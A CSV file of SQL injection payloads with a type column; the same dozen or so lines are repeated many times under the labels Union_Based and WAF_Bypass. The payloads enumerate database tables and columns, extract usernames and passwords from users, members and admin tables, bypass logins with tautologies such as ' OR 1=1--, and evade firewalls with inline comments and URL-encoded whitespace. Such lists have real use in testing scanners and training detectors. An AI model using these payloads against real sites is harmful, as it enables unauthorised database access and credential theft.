Payload,Tipo
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
' OR 1=1--,WAF_Bypass
' OR '1'='1'--,WAF_Bypass
' OR 'a'='a'/*,WAF_Bypass
' OR 1=1;#,WAF_Bypass
' OR '1'='1' AND '1'='1'--,WAF_Bypass
' OR username LIKE 'admin%'--,WAF_Bypass
"' UNION SELECT null,null--",WAF_Bypass
"' UNION/**/SELECT/**/null,null--",WAF_Bypass
"' UNION%0aSELECT%0anull,null--",WAF_Bypass
"' UNION%09SELECT%09null,null--",WAF_Bypass
"' UNION%0d%0aSELECT%0d%0anull,null--",WAF_Bypass
"' UNION/*foo*/SELECT/*bar*/null,null--",WAF_Bypass
"' OR 1=CONVERT(int, '1')--",WAF_Bypass
' OR '1' LIKE '1'--,WAF_Bypass
"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",WAF_Bypass
